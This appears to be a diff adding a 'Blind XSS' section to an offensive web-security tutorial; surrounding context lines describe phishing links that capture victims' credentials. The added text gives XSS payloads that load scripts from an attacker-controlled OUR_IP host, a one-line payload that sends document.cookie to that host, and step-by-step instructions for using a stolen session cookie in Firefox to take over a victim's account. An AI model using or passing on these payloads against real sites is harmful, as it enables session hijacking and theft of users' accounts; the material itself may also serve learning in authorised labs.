@@ -145,3 +145,52 @@ http://target-website.com/phishing?url=<your_payload_here>
 
 2. **Send the URL**: Share the crafted URL with potential victims.
 3. **Capture Credentials**: When a victim logs in, their credentials will be sent to your server, and you can check `creds.txt` for the captured information.
+
+### **Blind XSS**
+
+**Understanding Session Hijacking and XSS Attacks**
+
+When you use websites, they often remember you by using something called cookies. These cookies are small pieces of data that help you stay logged in, so you don’t have to enter your password every time. But if a bad person gets hold of your cookie, they can pretend to be you and access your account without knowing your password. This is called **session hijacking**.
+
+#### What is Blind XSS?
+
+Sometimes, websites have a problem called **XSS (Cross-Site Scripting)**. This happens when someone can put harmful code (like JavaScript) into a website, and that code runs when someone else visits the site. A special kind of XSS is called **Blind XSS**. This means the bad code runs on a part of the website that the attacker can’t see, like an admin page.
+
+#### How to Find Blind XSS:
+
+To find out if a website has this problem, we can try to send a special code that asks for help from our own computer. For example, we can use a piece of code like this:
+
+```html
+<script src="http://OUR_IP/username"></script>
+```
+
+Here, `OUR_IP` is the address of our computer. If the website runs our code, it will send a message back to us, and we’ll know it’s vulnerable.
+
+#### Using Remote Scripts:
+
+We can also use a trick to load a script (a piece of code) from our computer onto the website. We can change the name of the script to match the field we are testing. For example, if we test a username field, we can name our script "username." If the website runs our script, we’ll see a request on our computer saying that the username field is vulnerable.
+
+#### Testing for Vulnerabilities:
+
+We can try different pieces of code in different fields on the website. Here are some examples of code we might use:
+
+```html
+<script src="http://OUR_IP"></script>
+'><script src="http://OUR_IP"></script>
+```
+
+If we find one that works, we’ll know that field is vulnerable. We can skip fields like email and password because they usually have extra protections.
+
+#### Stealing Cookies:
+
+Once we find a vulnerable field, we can use another piece of code to grab the cookie from the victim’s browser and send it to our computer. For example, we can use this code:
+
+```javascript
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+```
+
+This code creates a new image that points to our server and includes the cookie in the URL. This way, we can see what the cookie is and pretend to be the victim.
+
+#### How to Use the Stolen Cookie:
+
+After we get the cookie, we can use it to log into the victim’s account. We just need to add the cookie to our browser. In Firefox, we can open the Developer Tools, go to the Storage section, and add our cookie. The cookie has a name (like "session") and a value (like a long string of letters and numbers). Once we set our cookie, we can refresh the page, and we will have access to the victim's account.
